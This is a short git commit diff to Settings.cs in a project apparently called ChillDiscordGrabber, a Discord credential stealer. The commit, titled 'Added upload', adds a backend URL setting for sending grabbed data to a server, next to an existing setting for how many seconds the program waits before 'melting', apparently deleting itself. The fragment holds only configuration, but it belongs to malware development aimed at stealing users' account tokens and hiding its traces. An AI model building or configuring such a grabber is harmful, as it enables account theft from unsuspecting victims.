578620527d72af23959b72de7d69f808f7e2ad38
PaulDotSH <84643540+PaulDotSH@users.noreply.github.com>
2021-09-09 06:25:38 -0700

    Added upload

--- Settings.cs
+++ Settings.cs
@@ -8,6 +8,9 @@ namespace ChillDiscordGrabber
 {
     class Settings
     {
+        //Must include port if it isn't 80 and it isn't a dns
+        public static string BackendUrl = "http://127.0.0.1:38912";
+
         //Must be greater than 0
         public static int SeondsToMeltIn = 3;
 
